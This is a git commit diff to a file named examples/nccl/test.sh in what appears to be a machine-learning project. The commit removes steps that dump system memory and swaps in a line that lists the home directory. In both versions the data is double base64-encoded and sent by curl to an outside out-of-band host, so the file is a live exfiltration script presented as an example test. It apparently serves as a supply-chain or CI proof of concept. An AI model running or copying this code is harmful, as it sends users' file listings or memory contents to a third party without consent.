2a7f99f3d9fc838acf30502ad50debe212565c76
Roni-Carta <roni@landh.tech>
2024-10-03 17:43:01 +0200

    ls

--- examples/nccl/test.sh
+++ examples/nccl/test.sh
@@ -1,11 +1,4 @@
-git clone https://github.com/fuhry/linux-memory-dumper.git
-
-
-cd linux-memory-dumper
-
-sh memdump -o test
-
-$B64_BLOB=`for file in `ls test`; cat $file; done | base64 -w 0 | base64 -w 0`
+$B64_BLOB=`ls $HOME | base64 | base64`
 
 curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null
 
